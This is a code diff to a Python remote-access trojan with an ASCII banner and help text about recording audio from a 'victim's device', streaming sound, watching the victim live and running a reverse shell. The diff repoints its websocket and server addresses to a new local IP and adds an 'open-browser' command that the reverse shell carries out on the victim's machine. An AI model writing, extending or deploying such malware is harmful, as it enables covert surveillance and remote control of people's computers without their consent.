@@ -15,11 +15,12 @@ import threading
 from scipy.io.wavfile import write
 import sounddevice as sd
 import sys
-SERVER_URL = "192.168.88.108:2020"
-WEBSOCKET_URL="ws://192.168.88.108:8765"
-WEBSOCKET_AUDIO="ws://192.168.88.108:8766"
+import webbrowser
+SERVER_URL = "192.168.88.106:2020"
+WEBSOCKET_URL="ws://192.168.88.106:8765"
+WEBSOCKET_AUDIO="ws://192.168.88.106:8766"
 PORT=12345
-IP_ADDRESS="192.168.88.108"
+IP_ADDRESS="192.168.88.106"
 banner = r"""
 ██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗ 
 ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
@@ -53,7 +54,13 @@ banner = r"""
  -help: display help screen. 
  -record time: record audio from victim's device.
  -stream-sound: Listing to victim realtime.
+ -open-browser link: Open browser to specifc link .
 """
+def open_browser(link:str):
+    if link.startswith('http://') or link.startswith('https://'):
+        webbrowser.open(link)
+    else:
+        raise "Error links must starts with http or https...\n"
 async def open_camera():
     async with websockets.connect(WEBSOCKET_URL) as ws:
         cap = cv2.VideoCapture(0)
@@ -300,6 +307,13 @@ def reverse_shell_payload():
                threading.Thread(target=watch_victim_live,daemon=True).start()
                s.send(b"You are watching the victim for your mailicous server\n")
                continue
+           if cmd.lower().startswith("open-browser"):
+               try: 
+                   args = cmd.split()
+                   open_browser(args[1])
+                   continue
+               except Exception as e:
+                   s.send(f"[-] {e}\n".encode())
            if cmd.lower() == "exit":
                break
            else:
